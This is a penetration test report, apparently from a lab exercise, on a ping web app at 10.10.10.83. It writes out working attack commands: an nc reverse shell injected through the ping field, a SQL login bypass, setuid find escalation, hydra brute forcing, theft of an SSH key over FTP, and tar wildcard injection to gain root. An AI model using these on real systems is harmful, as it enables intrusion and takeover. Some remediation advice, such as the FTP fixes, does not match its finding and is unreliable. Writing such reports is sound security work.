
# Penetration Test Report

## PINGOZAURUS Website - EvilCorp

### Conducted by EvilCorp Ethical Hackers

üìÖ **Test Date**: January 31, 2025  
üë§ **Author**: EvilCorp Ethical Hackers  
üè¢ **Company/Client**: EvilCorp  
üåê **Target Application**: IP 10.10.10.83 (PINGOZAURUS Website)  
üîç **Objective**: Identify potential cybersecurity vulnerabilities on the PINGOZAURUS website and propose remediation solutions.


---

## 1. Introduction

### 1.1 Test Objective

We were tasked with investigating potential security vulnerabilities on the PINGOZAURUS website (IP: 10.10.10.83) and providing recommendations where applicable. Our approach involved "attacking" the site to identify weaknesses in:

- The website and its functionalities
- The associated server
- Server users
- Directory/file structures
- Active processes/tasks

### 1.2 Test Scope

- **Step 1**: Map the server (10.10.10.83) to identify ports, their statuses, and potential exploitation opportunities.
- **Step 2**: Search for vulnerabilities in the website‚Äôs functionalities, server management, ports, users, and scheduled task commands.

### 1.3 Methodology

1. **Server Scan**: Using nmap command.
2. **Server Connection**: Command injection + Reverse Shell.
3. **User Exploitation**: Command injection to identify passwords and impersonate authenticated users.
4. **Cron Job Exploitation**: Inject unauthorized code into scheduled tasks to gain administrative access to the server.

---

## 2. Summary of Identified Risks

### 2.1 Results Summary

|ID|Vulnerability|Severity|Impact|
|---|---|---|---|
|0|Web server analysis to identify structure and potential flaws|Low|Identification of ports and their statuses|
|1|Command injection in the ping input field of PINGOZAURUS|‚ö†Ô∏è Critical|Server intrusion as www-data user, ability to view exploitable users|
|2|Command injection in the login/password fields of the Administration page|‚ö†Ô∏è Critical|Access to bob‚Äôs privileges, discovery of the find binary, and privilege escalation to root|
|3|Unrestricted FTP access via port 21 (anonymous login without password)|‚ö†Ô∏è Urgent|Download sensitive information|
|4|SSH vulnerability|‚ö†Ô∏è Urgent|Potential to brute-force passwords|
|5|Cron job exploitation via tar command|‚ö†Ô∏è Critical|Privilege escalation to root|

### 2.2 Overall Security Level

- **Risk Level**: [Critical]
- **General Recommendation**: [Immediate actions required + detailed long-term action plan provided at the end of the report]

---

## 3. Vulnerability Details

### 3.1 Web Server Analysis

**Description**: We scanned the server hosting the PINGOZAURUS website (IP: 10.10.10.83) to identify exploitable information.

- **Method**: nmap -p- 10.10.10.83 revealed 4 open ports, all potentially exploitable.

<img src="./attachements/image_1743689196896.png" width="auto">
---

### 3.2 Port 80 (HTTP) Exploitation and Command Injection

#### 3.2.1 Explanation

- Port 80 (HTTP) is used for web servers but is outdated and less secure than HTTPS, making it vulnerable to exploitation.
- We tested the website‚Äôs ping input field for command injection (not its intended purpose).

#### 3.2.2 Method: Command Injection

1. **Initial Test**:
    - Command: 10.10.10.83 | ls
    - Result: Revealed 6 files/directories.
    
 -<img src="./attachements/image_1743689822909.png" width="auto">
    
2. **Detailed Exploration**:
    - Command: 10.10.10.83 | ls -ail
    - Result: Identified root and www-data users with exploitable privileges.
  -<img src="./attachements/image_1743689873813.png" width="auto">
	- 
3. **Reverse Shell**:
    - Set our machine to listen on port 4444.
	 --<img src="./attachements/image_1743689902841.png" width="auto">
    
    - Injected command: 10.10.10.83 | rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.132.131 4444 >/tmp/f
   -<img src="./attachements/image_1743689930296.png" width="auto">
    - Result: Established a connection as www-data, allowing us to view users (alice, bob, john).
    -<img src="./attachements/image_1743689967072.png" width="auto">
   -<img src="./attachements/image_1743690002013.png" width="auto">
	
	 --<img src="./attachements/image_1743690036181.png" width="auto">
	

	
#### 3.2.3 Risk Mapping

 --<img src="./attachements/image_1743690069318.png" width="auto">

#### 3.2.3 Remediation plan

- ‚úÖ Prevent command execution in input fields.
- ‚úÖ Restrict commands allowed in the input field.

---

### 3.3 Port 8081 Exploitation (Similar to 3.2)

#### 3.3.1 Explanation

- Port 8081 (blackice-icecap) is open and exhibits the same vulnerabilities as port 80.
-<img src="./attachements/image_1743690132871.png" width="auto">
#### 3.3.2 Method: Command Injection

1. **Discovery**:
    - URL: 10.10.10.83:8081 revealed a site with clickable links.
    - The "Administration" link had login/password fields.
-<img src="./attachements/image_1743690168499.png" width="auto">
2. **Injection**:
    - Command: ' OR 1=1 -- -
    
--<img src="./attachements/image_1743690206842.png" width="auto">
    - Result: Retrieved a note with bob‚Äôs new password.
-<img src="./attachements/image_1743690245217.png" width="auto">
3. **SSH Access**:
    - Command: ssh bob@10.10.10.83
    - Result: Logged in as bob, found the find binary with setuid privileges (-rwsrwsr--).
-<img src="./attachements/image_1743690282841.png" width="auto">-<img src="./attachements/image_1743690330724.png" width="auto">
4.
	**Privilege Escalation**:
    - Exploited find with: find . -exec /bin/bash -p \;
-<img src="./attachements/image_1743690450071.png" width="auto">
-<img src="./attachements/image_1743690413746.png" width="auto">
    - Result: Gained root access (whoami = root).
-<img src="./attachements/image_1743690485221.png" width="auto">
		
#### 3.3.3 Remediation Plan

- ‚úÖ Validate user inputs (filter/secure login/password fields and error responses).
- ‚úÖ Implement a Web Application Firewall (WAF) to block SQL injections.
- ‚úÖ Follow OWASP Top 10 (2025) & Mitigation Strategies.
- ‚úÖ Filter port 8081 via firewall.
- ‚úÖ Ensure authenticated access (e.g., login/password, OAuth, JWT).
- ‚úÖ Limit database permissions (e.g., avoid DELETE queries).
- ‚úÖ Update logs and monitor suspicious attempts.


### 3.4 Anonymous FTP (Unsecured Access)

- **Location**: ftp 10.10.10.83 (port 21 open)
- **Tools**: FTP service
- **Impact**: Download sensitive information

#### 3.4.1 Details

- Connected anonymously:
    
    
    `ftp 10.10.10.83 Name: anonymous Password: (none)
    Connected to 10.10.10.83.
	220 (vsFTPd 3.0.5)
	Name (10.10.10.83:kali): anonymous
	331 Please specify the password.
	Password: 
	230 Login successful.
	Remote system type is UNIX.
	Using binary mode to transfer files.
	ftp> ls
	229 Entering Extended Passive Mode (|||21104|)
	150 Here comes the directory listing.

    
- Navigated to /alice/files and downloaded an id_rsa SSH private key:
    
	    ftp> cd alice
	250 Directory successfully changed.
	ftp> ls
	229 Entering Extended Passive Mode (|||21101|)
	150 Here comes the directory listing.
	drwxr-xr-x    1 ftp      ftp          4096 Aug 28 15:07 files
	226 Directory send OK.
	ftp> 
    -<img src="./attachements/image_1743690546787.png" width="auto">
    --<img src="./attachements/image_1743690597483.png" width="auto">
	
- Attempted SSH: ssh -i id_rsa alice@10.10.10.83
- Fixed permissions: chmod 600 id_rsa to resolve "bad permissions" error.
  -<img src="./attachements/image_1743690633358.png" width="auto">

#### 3.4.2 Remediation Plan

- ‚úÖ Filter and escape user inputs (htmlspecialchars()).
- ‚úÖ Enable Content Security Policy (CSP).
- ‚úÖ Restrict cookies (HttpOnly, Secure).

---

### 3.5 SSH Vulnerability (Unsecured Access)

- **Location**: ssh 10.10.10.83 (port 22 open)
- **Tools**: SSH service
- **Impact**: Access sensitive information


#### 3.5.1 Details

- Brute-forced john‚Äôs password using:
    
    bash
    
    R√©duireEnvelopperCopier
    
    `hydra -l john -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.83 -V`
    
- Result: Cracked the password (weak security).
- --<img src="./attachements/image_1743690702802.png" width="auto">
	

#### 3.5.2 Remediation Plan

1. **Detection**:
    - Check SSH logs.
    - Monitor connections with netstat.
2. **Prevention**:
    - Block SSH after 3 failed attempts.
    - Use stronger passwords (numbers, special characters).
    - Implement two-factor authentication (2FA).

---

### 3.6 Cron Job Vulnerability

#### 3.6.1 Details

- **Vulnerability**: tar command in cron jobs with root privileges.
- **Impact**: root privilege escalation.
- Cron job:
    
    `*/5 * * * * root cd /home/john/ && tar -zcf /home-john-backup.tgz *`
    
- **Exploitation**:
    - Created files to inject a script (shell.sh):
        
        -<img src="./attachements/image_1743690794958.png" width="auto">
        
        `touch -- "--checkpoint=1" touch -- "--checkpoint-action=exec=sh shell.sh" echo "john ALL=(ALL) NOPASSWD:ALL" > shell.sh chmod +x shell.sh`
        
    - After <5 minutes, john gained root privileges via sudo su.
    --<img src="./attachements/image_1743690843998.png" width="auto">
      -<img src="./attachements/image_1743690898550.png" width="auto">
     -<img src="./attachements/image_1743690920854.png" width="auto">
#### 3.6.2 Remediation Plan

- ‚úÖ Avoid wildcards (*) in cron jobs.
- ‚úÖ Update cron job:
    - Before: tar -zcf /home-john-backup.tgz *
    - After: tar -zcf /home-john-backup.tgz ./john

---

## 4. General Recommendations

- ‚úÖ Address identified vulnerabilities with recommended fixes.
- ‚úÖ Conduct regular security tests (penetration testing).
- ‚úÖ Keep systems and applications updated.
- ‚úÖ Train developers and raise user awareness (OWASP best practices).

---

## 5. Conclusion

This report highlights critical vulnerabilities requiring immediate attention. We recommend implementing a rapid action plan to mitigate risks and enhance overall system security.
